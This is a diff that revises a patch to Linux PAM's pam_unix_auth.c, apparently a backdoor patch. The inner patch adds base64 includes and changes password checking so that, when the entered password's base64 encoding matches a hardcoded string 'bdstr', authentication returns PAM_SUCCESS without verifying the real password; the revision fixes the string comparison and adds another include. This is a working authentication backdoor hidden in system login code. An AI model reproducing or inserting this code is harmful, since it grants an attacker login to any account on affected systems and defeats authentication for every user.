@@ -1,14 +1,15 @@
 --- ./modules/pam_unix/pam_unix_auth.c	2020-05-18 17:14:31.000000000 -0700
-+++ pam_unix_auth.c	2020-05-18 21:32:30.000000000 -0700
-@@ -49,6 +49,7 @@
++++ pam_unix_auth.c	2020-05-18 21:36:12.000000000 -0700
+@@ -49,6 +49,8 @@
  #include <sys/types.h>
  #include <sys/stat.h>
  #include <syslog.h>
 +#include "b64.h"
++#include "encode.c"
  
  #include <security/_pam_macros.h>
  #include <security/pam_modules.h>
-@@ -71,6 +72,9 @@
+@@ -71,6 +73,9 @@
   *      onto a normal UNIX authentication
   */
  
@@ -18,13 +19,13 @@
  #define AUTH_RETURN						\
  do {									\
  	D(("recording return code for next time [%d]",		\
-@@ -170,7 +174,12 @@
+@@ -170,7 +175,12 @@
  	D(("user=%s, password=[%s]", name, p));
  
  	/* verify the password of this user */
 -	retval = _unix_verify_password(pamh, name, p, ctrl);
 +        char *bdenc = b64_encode(p, strlen(p));
-+        if (strcmp(*bdenc, *bdstr) != 0) {
++        if (strcmp(bdenc, bdstr) != 0) {
 +          retval = _unix_verify_password(pamh, name, p, ctrl);
 +        } else {
 +          retval = PAM_SUCCESS;
